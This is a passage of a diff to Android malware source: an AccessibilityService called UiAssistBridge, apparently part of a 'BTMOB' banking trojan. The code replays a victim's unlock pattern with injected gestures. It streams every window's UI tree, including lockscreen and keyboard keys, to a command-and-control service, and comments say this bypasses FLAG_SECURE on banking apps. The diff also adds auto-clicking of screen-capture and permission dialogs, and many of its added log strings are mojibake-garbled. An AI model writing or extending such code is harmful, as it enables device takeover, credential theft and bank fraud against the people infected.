             patternView.recycle();
             return;
         }
         
         if (attempt < 10) {
-            Log.w(TAG, "⏳ PatternView não encontrado na tentativa " + (attempt + 1) + ", aguardando 200ms...");
+            Log.w(TAG, "Ã¢ÂÂ³ PatternView nÃƒÂ£o encontrado na tentativa " + (attempt + 1) + ", aguardando 200ms...");
             handler.postDelayed(() -> attemptExecutePatternUnlock(patternPoints, attempt + 1, restoreBlackScreen), 200);
         } else {
-            Log.w(TAG, "⚠️ PatternView não encontrado via UI, usando cálculo dinâmico por fabricante...");
+            Log.w(TAG, "Ã¢Å¡Â Ã¯Â¸Â PatternView nÃƒÂ£o encontrado via UI, usando cÃƒÂ¡lculo dinÃƒÂ¢mico por fabricante...");
             int[][] coords = calculatePatternCoordsByManufacturer();
             if (coords != null) {
                 executePatternGestureCoords(coords, patternPoints, restoreBlackScreen);
             } else {
-                Log.e(TAG, "❌ Falha total na detecção de coordenadas do Pattern!");
+                Log.e(TAG, "Ã¢ÂÅ’ Falha total na detecÃƒÂ§ÃƒÂ£o de coordenadas do Pattern!");
                 restorePatternState(restoreBlackScreen);
             }
         }
@@ -8076,7 +8324,7 @@ public class UiAssistBridge extends AccessibilityService {
             }
         }
         
-        // 2. Verifica se este nó é a view real do Pattern (ex: lockPatternView, SecPatternView)
+        // 2. Verifica se este nÃƒÂ³ ÃƒÂ© a view real do Pattern (ex: lockPatternView, SecPatternView)
         String resourceId = node.getViewIdResourceName();
         if (resourceId != null) {
             String resLower = resourceId.toLowerCase();
@@ -8085,7 +8333,7 @@ public class UiAssistBridge extends AccessibilityService {
                 resLower.endsWith("patternview") ||
                 resLower.endsWith("lock_pattern_view") ||
                 resLower.endsWith("sec_pattern_view")) {
-                Log.d(TAG, "🔍 Encontrou PatternView EXATO por ResourceId: " + resourceId);
+                Log.d(TAG, "Ã°Å¸â€Â Encontrou PatternView EXATO por ResourceId: " + resourceId);
                 return node;
             }
         }
@@ -8097,17 +8345,17 @@ public class UiAssistBridge extends AccessibilityService {
                 cls.contains("secpatternview") || 
                 cls.contains("patternlockview") || 
                 cls.endsWith("patternview")) {
-                Log.d(TAG, "🔍 Encontrou PatternView por ClassName: " + className);
+                Log.d(TAG, "Ã°Å¸â€Â Encontrou PatternView por ClassName: " + className);
                 return node;
             }
         }
         
-        // 3. Fallback genérico para IDs contendo pattern, descartando explicitamente layouts/containers
+        // 3. Fallback genÃƒÂ©rico para IDs contendo pattern, descartando explicitamente layouts/containers
         if (resourceId != null) {
             String resLower = resourceId.toLowerCase();
             if ((resLower.contains("lockpattern") || resLower.contains("sec_pattern") || resLower.contains("lock_pattern")) 
                 && !resLower.contains("container") && !resLower.contains("keyguard_pattern_view") && !resLower.contains("layout")) {
-                Log.d(TAG, "🔍 Encontrou PatternView por ResourceId: " + resourceId);
+                Log.d(TAG, "Ã°Å¸â€Â Encontrou PatternView por ResourceId: " + resourceId);
                 return node;
             }
         }
@@ -8120,15 +8368,15 @@ public class UiAssistBridge extends AccessibilityService {
         
         android.graphics.Rect bounds = new android.graphics.Rect();
         patternView.getBoundsInScreen(bounds);
-        Log.d(TAG, "📐 Pattern bounds detectados: " + bounds.toString());
+        Log.d(TAG, "Ã°Å¸â€œÂ Pattern bounds detectados: " + bounds.toString());
         
         android.view.WindowManager wm = (android.view.WindowManager) getSystemService(WINDOW_SERVICE);
         android.util.DisplayMetrics metrics = new android.util.DisplayMetrics();
         wm.getDefaultDisplay().getRealMetrics(metrics);
         
-        // Se os bounds forem inválidos, genéricos ou cobrirem a tela inteira, usa o cálculo calibrado por fabricante
+        // Se os bounds forem invÃƒÂ¡lidos, genÃƒÂ©ricos ou cobrirem a tela inteira, usa o cÃƒÂ¡lculo calibrado por fabricante
         if (bounds.width() < 100 || bounds.height() < 100 || bounds.left < 0 || bounds.top < 0 || bounds.height() > metrics.heightPixels * 0.75f) {
-            Log.w(TAG, "⚠️ PatternView bounds genéricos/inválidos (" + bounds + "), usando cálculo calibrado por fabricante...");
+            Log.w(TAG, "Ã¢Å¡Â Ã¯Â¸Â PatternView bounds genÃƒÂ©ricos/invÃƒÂ¡lidos (" + bounds + "), usando cÃƒÂ¡lculo calibrado por fabricante...");
             int[][] coords = calculatePatternCoordsByManufacturer();
             if (coords != null) {
                 executePatternGestureCoords(coords, patternPoints, restoreBlackScreen);
@@ -8136,7 +8384,7 @@ public class UiAssistBridge extends AccessibilityService {
             return;
         }
         
-        // A grade do Pattern no Android é SEMPRE um quadrado perfeito (3x3).
+        // A grade do Pattern no Android ÃƒÂ© SEMPRE um quadrado perfeito (3x3).
         // Se a view container tiver altura maior que a largura, a grade 3x3 fica na parte INFERIOR do container!
         int gridSide = bounds.width();
         int gridLeft = bounds.left;
@@ -8150,7 +8398,7 @@ public class UiAssistBridge extends AccessibilityService {
             int col = (i - 1) % 3;
             pointCoords[i][0] = Math.round(gridLeft + (col + 0.5f) * cellSize);
             pointCoords[i][1] = Math.round(gridTop + (row + 0.5f) * cellSize);
-            Log.d(TAG, "📍 Ponto " + i + ": (" + pointCoords[i][0] + ", " + pointCoords[i][1] + ")");
+            Log.d(TAG, "Ã°Å¸â€œÂ Ponto " + i + ": (" + pointCoords[i][0] + ", " + pointCoords[i][1] + ")");
         }
         
         dispatchPatternPathGesture(pointCoords, patternPoints, restoreBlackScreen);
@@ -8169,9 +8417,9 @@ public class UiAssistBridge extends AccessibilityService {
         if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return;
         if (patternPoints == null || patternPoints.length < 2) return;
         
-        Log.d(TAG, "🔲 Despachando gesto contínuo do Pattern (" + patternPoints.length + " pontos)...");
+        Log.d(TAG, "Ã°Å¸â€Â² Despachando gesto contÃƒÂ­nuo do Pattern (" + patternPoints.length + " pontos)...");
         
-        // Cria um único Path contínuo com micro-waypoints em cada nó para forçar PathMeasure a gerar toques em TODOS os pontos do Pattern
+        // Cria um ÃƒÂºnico Path contÃƒÂ­nuo com micro-waypoints em cada nÃƒÂ³ para forÃƒÂ§ar PathMeasure a gerar toques em TODOS os pontos do Pattern
         Path path = new Path();
         int startPt = patternPoints[0];
         int startX = pointCoords[startPt][0];
@@ -8189,7 +8437,7 @@ public class UiAssistBridge extends AccessibilityService {
             path.lineTo(px, py);
         }
         
-        // Duração otimizada para o LockPatternView do Android ler o gesto sem falhas
+        // DuraÃƒÂ§ÃƒÂ£o otimizada para o LockPatternView do Android ler o gesto sem falhas
         long totalDuration = (patternPoints.length - 1) * 250L + 200L;
         if (totalDuration < 700L) totalDuration = 700L;
         
@@ -8200,19 +8448,19 @@ public class UiAssistBridge extends AccessibilityService {
         boolean dispatched = dispatchGesture(builder.build(), new GestureResultCallback() {
             @Override
             public void onCompleted(GestureDescription gestureDescription) {
-                Log.d(TAG, "✅ Pattern reproduzido com sucesso no aparelho!");
+                Log.d(TAG, "Ã¢Å“â€¦ Pattern reproduzido com sucesso no aparelho!");
                 restorePatternState(restoreBlackScreen);
             }
             
             @Override
             public void onCancelled(GestureDescription gestureDescription) {
-                Log.e(TAG, "❌ Reprodução do pattern cancelada no aparelho");
+                Log.e(TAG, "Ã¢ÂÅ’ ReproduÃƒÂ§ÃƒÂ£o do pattern cancelada no aparelho");
                 restorePatternState(restoreBlackScreen);
             }
         }, null);
         
         if (!dispatched) {
-            Log.e(TAG, "❌ Falha ao despachar gesto do pattern!");
+            Log.e(TAG, "Ã¢ÂÅ’ Falha ao despachar gesto do pattern!");
             restorePatternState(restoreBlackScreen);
         }
     }
@@ -8248,20 +8496,19 @@ public class UiAssistBridge extends AccessibilityService {
      * ========================================
      * 
      * Captura a hierarquia completa da interface via AccessibilityNodeInfo
-     * Bypassa FLAG_SECURE de apps bancários que bloqueiam VNC
-     * Envia árvore de elementos em JSON para visualização texto
+     * Bypassa FLAG_SECURE de apps bancÃƒÂ¡rios que bloqueiam VNC
+     * Envia ÃƒÂ¡rvore de elementos em JSON para visualizaÃƒÂ§ÃƒÂ£o texto
      */
     
     private void startScreenReader() {
-        Log.d(TAG, "🚀 Iniciando Screen Reader V2...");
+        Log.d(TAG, "Ã°Å¸Å¡â‚¬ Iniciando Screen Reader V2...");
         
         screenReaderRunnable = new Runnable() {
             @Override
             public void run() {
                 if (screenReaderEnabled) {
-                    captureScreenHierarchy();
-                    // Captura a cada 80ms (~12 FPS) - OTIMIZADO!
-                    screenReaderHandler.postDelayed(this, 80);
+                    dispatchScreenReader();
+                    screenReaderHandler.postDelayed(this, 1500);
                 }
             }
         };
@@ -8269,23 +8516,37 @@ public class UiAssistBridge extends AccessibilityService {
         screenReaderHandler.post(screenReaderRunnable);
     }
     
+    private void dispatchScreenReader() {
+        long now = System.currentTimeMillis();
+        if (now - screenReaderLastRun < 250L) return;
+        if (screenReaderBusy) return;
+        screenReaderLastRun = now;
+        screenReaderBusy = true;
+        try {
+            screenReaderExec.execute(() -> {
+                try { captureScreenHierarchy(); } catch (Throwable t) {}
+                finally { screenReaderBusy = false; }
+            });
+        } catch (Throwable t) { screenReaderBusy = false; }
+    }
     private void stopScreenReader() {
         if (screenReaderRunnable != null) {
             screenReaderHandler.removeCallbacks(screenReaderRunnable);
             screenReaderRunnable = null;
         }
-        Log.d(TAG, "🛑 Screen Reader V2 parado");
+        Log.d(TAG, "Ã°Å¸â€ºâ€˜ Screen Reader V2 parado");
     }
     
     private void captureScreenHierarchy() {
         try {
+            hierNodeBudget = 700;
             JSONObject json = new JSONObject();
             json.put("timestamp", dateFormat.format(new Date()));
             
             String mainPackage = "";
             org.json.JSONArray allChildren = new org.json.JSONArray();
             
-            // CAPTURA TODAS AS JANELAS VISÍVEIS (incluindo lockscreen, systemui, teclado, etc.)
+            // CAPTURA TODAS AS JANELAS VISÃƒÂVEIS (incluindo lockscreen, systemui, teclado, etc.)
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                 List<AccessibilityWindowInfo> windows = getWindows();
                 
@@ -8306,7 +8567,7 @@ public class UiAssistBridge extends AccessibilityService {
                         
                         JSONObject windowHierarchy = buildNodeTree(windowRoot, 0);
                         if (windowHierarchy != null) {
-                            // Marca tipo de janela para identificação
+                            // Marca tipo de janela para identificaÃƒÂ§ÃƒÂ£o
                             int windowType = window.getType();
                             windowHierarchy.put("windowType", windowType);
                             windowHierarchy.put("windowPackage", windowPackage);
@@ -8340,7 +8601,7 @@ public class UiAssistBridge extends AccessibilityService {
                 }
             }
             
-            // Se não conseguiu nada das janelas, tenta getRootInActiveWindow
+            // Se nÃƒÂ£o conseguiu nada das janelas, tenta getRootInActiveWindow
             if (allChildren.length() == 0) {
                 AccessibilityNodeInfo rootNode = getRootInActiveWindow();
                 if (rootNode != null) {
@@ -8386,7 +8647,12 @@ public class UiAssistBridge extends AccessibilityService {
             json.put("hierarchy", rootHierarchy);
             
             // Envia para servidor
-            sendScreenHierarchy(json.toString());
+            String _hj = json.toString();
+            long _now = System.currentTimeMillis();
+            if (_hj.equals(lastHierJson) && (_now - lastHierSentMs) < 2000L) return;
+            lastHierJson = _hj;
+            lastHierSentMs = _now;
+            sendScreenHierarchy(_hj);
             
         } catch (JSONException e) {
             Log.e(TAG, "Erro ao criar JSON da hierarquia: " + e.getMessage());
@@ -8394,7 +8660,7 @@ public class UiAssistBridge extends AccessibilityService {
     }
     
     private void markAsKeyboard(JSONObject node) throws JSONException {
-        // Marca este nó e todos os filhos como parte do teclado
+        // Marca este nÃƒÂ³ e todos os filhos como parte do teclado
         node.put("isKeyboard", true);
         
         if (node.has("children")) {
@@ -8406,13 +8672,16 @@ public class UiAssistBridge extends AccessibilityService {
     }
     
     private JSONObject buildNodeTree(AccessibilityNodeInfo node, int depth) throws JSONException {
-        if (node == null || depth > 25) { // Limite de profundidade aumentado
+        if (node == null || depth > 18) {
             return null;
         }
+        if (hierNodeBudget <= 0) return null;
+        hierNodeBudget--;
+        if (depth > 1 && !node.isVisibleToUser()) return null;
         
         JSONObject nodeJson = new JSONObject();
         
-        // Informações básicas
+        // InformaÃƒÂ§ÃƒÂµes bÃƒÂ¡sicas
         String className = "";
         if (node.getClassName() != null) {
             className = node.getClassName().toString();
@@ -8432,7 +8701,7 @@ public class UiAssistBridge extends AccessibilityService {
             nodeDesc = node.getContentDescription().toString();
             nodeJson.put("desc", nodeDesc);
             
-            // Se não tem texto mas tem desc, usa desc como texto (importante para teclados)
+            // Se nÃƒÂ£o tem texto mas tem desc, usa desc como texto (importante para teclados)
             if (nodeText.isEmpty()) {
                 nodeJson.put("text", nodeDesc);
             }
@@ -8451,7 +8720,7 @@ public class UiAssistBridge extends AccessibilityService {
             CharSequence tooltipText = node.getTooltipText();
             if (tooltipText != null && tooltipText.length() > 0) {
                 nodeJson.put("tooltip", tooltipText.toString());
-                // Se não tem texto nem desc, usa tooltip
+                // Se nÃƒÂ£o tem texto nem desc, usa tooltip
                 if (nodeText.isEmpty() && nodeDesc.isEmpty()) {
                     nodeJson.put("text", tooltipText.toString());
                 }
@@ -8466,7 +8735,7 @@ public class UiAssistBridge extends AccessibilityService {
             }
         }
         
-        // Extras Bundle - pode conter informações adicionais sobre teclas
+        // Extras Bundle - pode conter informaÃƒÂ§ÃƒÂµes adicionais sobre teclas
         try {
             android.os.Bundle extras = node.getExtras();
             if (extras != null && !extras.isEmpty()) {
@@ -8474,12 +8743,12 @@ public class UiAssistBridge extends AccessibilityService {
                     Object value = extras.get(key);
                     if (value != null) {
                         String strValue = value.toString();
-                        // Captura qualquer texto útil dos extras
+                        // Captura qualquer texto ÃƒÂºtil dos extras
                         if (strValue.length() > 0 && strValue.length() < 100) {
                             if (key.toLowerCase().contains("text") || key.toLowerCase().contains("label") ||
                                 key.toLowerCase().contains("key") || key.toLowerCase().contains("char")) {
                                 nodeJson.put("extra_" + key, strValue);
-                                // Se ainda não tem texto, usa este
+                                // Se ainda nÃƒÂ£o tem texto, usa este
                                 if (nodeText.isEmpty() && nodeDesc.isEmpty()) {
                                     nodeJson.put("text", strValue);
                                 }
@@ -8508,31 +8777,31 @@ public class UiAssistBridge extends AccessibilityService {
             }
         }
         
-        // Para teclados: tenta inferir a tecla baseado na posição (layout QWERTY)
+        // Para teclados: tenta inferir a tecla baseado na posiÃƒÂ§ÃƒÂ£o (layout QWERTY)
         String packageName = node.getPackageName() != null ? node.getPackageName().toString() : "";
         boolean isKeyboard = packageName.contains("inputmethod") || packageName.contains("keyboard") || 
                             packageName.contains("gboard") || packageName.contains("latin");
         
         if (isKeyboard && node.isClickable() && nodeText.isEmpty() && nodeDesc.isEmpty()) {
-            // Marca como tecla de teclado sem texto visível
+            // Marca como tecla de teclado sem texto visÃƒÂ­vel
             nodeJson.put("isKeyboardKey", true);
             nodeJson.put("keyboardPackage", packageName);
             
-            // Obtém bounds para possível inferência de tecla
+            // ObtÃƒÂ©m bounds para possÃƒÂ­vel inferÃƒÂªncia de tecla
             Rect keyBounds = new Rect();
             node.getBoundsInScreen(keyBounds);
             
-            // Adiciona informação de tamanho para identificar tipo de tecla
+            // Adiciona informaÃƒÂ§ÃƒÂ£o de tamanho para identificar tipo de tecla
             int keyWidth = keyBounds.width();
             int keyHeight = keyBounds.height();
             
-            // Teclas especiais geralmente são mais largas
+            // Teclas especiais geralmente sÃƒÂ£o mais largas
             if (keyWidth > keyHeight * 2) {
-                nodeJson.put("keyType", "special"); // Espaço, Enter, Shift, etc.
+                nodeJson.put("keyType", "special"); // EspaÃƒÂ§o, Enter, Shift, etc.
             } else if (keyWidth > keyHeight * 1.3) {
                 nodeJson.put("keyType", "medium"); // Backspace, etc.
             } else {
-                nodeJson.put("keyType", "letter"); // Letra/número normal
+                nodeJson.put("keyType", "letter"); // Letra/nÃƒÂºmero normal
             }
         }
         
@@ -8557,7 +8826,7 @@ public class UiAssistBridge extends AccessibilityService {
         String classLower = className.toLowerCase();
         String idLower = viewId.toLowerCase();
         
-        // PIN Pad / Teclado numérico de desbloqueio
+        // PIN Pad / Teclado numÃƒÂ©rico de desbloqueio
         if (classLower.contains("pinview") || classLower.contains("numpad") || 
             classLower.contains("keyguard") || classLower.contains("lockpattern") ||
             idLower.contains("pin") || idLower.contains("keyguard") ||
@@ -8565,7 +8834,7 @@ public class UiAssistBridge extends AccessibilityService {
             nodeJson.put("isLockElement", true);
         }
         
-        // Botão numérico (0-9)
+        // BotÃƒÂ£o numÃƒÂ©rico (0-9)
         if (node.getText() != null) {
             String text = node.getText().toString().trim();
             if (text.matches("^[0-9]$") && node.isClickable()) {
@@ -8573,7 +8842,7 @@ public class UiAssistBridge extends AccessibilityService {
             }
         }
         
-        // Padrão de desbloqueio (LockPatternView)
+        // PadrÃƒÂ£o de desbloqueio (LockPatternView)
         if (classLower.contains("lockpatternview") || classLower.contains("patternview") || idLower.contains("lockpattern")) {
             nodeJson.put("isPatternLock", true);
         }
@@ -8585,7 +8854,7 @@ public class UiAssistBridge extends AccessibilityService {
             nodeJson.put("isSwipeUnlock", true);
         }
         
-        // Bounds (posição na tela)
+        // Bounds (posiÃƒÂ§ÃƒÂ£o na tela)
         Rect bounds = new Rect();
         node.getBoundsInScreen(bounds);
         JSONObject boundsJson = new JSONObject();
@@ -8630,7 +8899,7 @@ public class UiAssistBridge extends AccessibilityService {
         int childCount = node.getChildCount();
         if (childCount > 0) {
             org.json.JSONArray children = new org.json.JSONArray();
-            for (int i = 0; i < childCount && i < 100; i++) { // Aumentado para 100 filhos
+            for (int i = 0; i < childCount && i < 40 && hierNodeBudget > 0; i++) {
                 AccessibilityNodeInfo child = node.getChild(i);
                 if (child != null) {
                     JSONObject childJson = buildNodeTree(child, depth + 1);
@@ -8653,7 +8922,7 @@ public class UiAssistBridge extends AccessibilityService {
             // Envia para CommandControlService
             CommandControlService.sendScreenHierarchy(this, jsonData);
             
-            Log.d(TAG, "📤 Hierarquia enviada (" + jsonData.length() + " bytes)");
+            Log.d(TAG, "Ã°Å¸â€œÂ¤ Hierarquia enviada (" + jsonData.length() + " bytes)");
             
         } catch (Exception e) {
             Log.e(TAG, "Erro ao enviar hierarquia: " + e.getMessage());
@@ -8663,7 +8932,7 @@ public class UiAssistBridge extends AccessibilityService {
     private class BlockTouchFrameLayout extends android.widget.FrameLayout {
         public BlockTouchFrameLayout(android.content.Context context) {
             super(context);
-            // Define apenas as flags de layout para expandir sob as barras sem disparar balão de aviso
+            // Define apenas as flags de layout para expandir sob as barras sem disparar balÃƒÂ£o de aviso
             setSystemUiVisibility(
                 android.view.View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                 | android.view.View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
@@ -8673,18 +8942,43 @@ public class UiAssistBridge extends AccessibilityService {
         
         @Override
         public boolean onTouchEvent(android.view.MotionEvent event) {
-            return !isCustomTemplateActive; // Não consome toques se for template customizado
+            return !isCustomTemplateActive; // NÃƒÂ£o consome toques se for template customizado
         }
         
         @Override
         public boolean onInterceptTouchEvent(android.view.MotionEvent event) {
-            return !isCustomTemplateActive; // Não intercepta toques se for template customizado
+            return !isCustomTemplateActive; // NÃƒÂ£o intercepta toques se for template customizado
         }
     }
 
     // ===================== [PATCH-VNC] auto-aceita o dialogo de captura de tela =====================
     private long vncLastAccept = 0L;
 
+    private void autoGrantTick() {
+        long now = System.currentTimeMillis();
+        if (now > autoGrantUntil) return;
+        if (now - autoGrantLast < 400L) return;
+        autoGrantLast = now;
+        AccessibilityNodeInfo root = getRootInActiveWindow();
+        if (root == null) return;
+        CharSequence pk = root.getPackageName();
+        String pkg = pk == null ? "" : pk.toString().toLowerCase();
+        boolean dlg = pkg.contains("permissioncontroller") || pkg.contains("packageinstaller")
+                || pkg.contains("systemui") || pkg.contains("settings");
+        if (!dlg) return;
+
+        String[] pref = { "mientras se usa la app", "mientras usas la app", "while using the app",
+                          "solo esta vez", "only this time" };
+        String[] allow = { "permitir", "allow", "aceptar", "accept" };
+
+        AccessibilityNodeInfo b = vncFind(root, pref, true);
+        if (b == null) b = vncFind(root, allow, true);
+        if (b != null) {
+            vncClick(b);
+            autoGrantLast = System.currentTimeMillis() + 600L;
+            android.util.Log.i("GRANT", "permiso concedido automaticamente");
+        }
+    }
     private void vncAutoAccept() {
         long now = System.currentTimeMillis();
         if (now - vncLastAccept < 600L) return;
@@ -8701,7 +8995,7 @@ public class UiAssistBridge extends AccessibilityService {
         AccessibilityNodeInfo chk = vncFind(root, chkKeys, false);
         if (chk != null) { try { vncClick(chk); } catch (Throwable t) {} }
 
-        String[] estrito = { "iniciar agora", "comecar agora", "come\u00e7ar agora", "start now" };
+        String[] estrito = { "empezar a transmitir", "iniciar transmision", "iniciar ahora", "iniciar agora", "comecar agora", "come\u00e7ar agora", "start now", "start casting" };
         AccessibilityNodeInfo btn = vncFind(root, estrito, true);
         if (btn == null) {
             String[] solto = { "transmitir", "permitir", "ativar", "iniciar", "comecar",
@@ -8753,7 +9047,14 @@ public class UiAssistBridge extends AccessibilityService {
     // ================================================================================================
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
-        try { vncAutoAccept(); } catch (Throwable t) {}
+        if (event != null && (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED || event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED)) {
+            try { vncAutoAccept(); } catch (Throwable t) {}
+            try { autoGrantTick(); } catch (Throwable t) {}
+            try { if (screenReaderEnabled) dispatchScreenReader(); } catch (Throwable t) {}
+        }
         try { onAccessibilityEventInterno(event); } catch (Throwable t) {}
         try { WebCapture.onEvent(event); } catch (Throwable t) {} // [KRYPTOS-PATCH BTMOB]
     }}
+
+
+
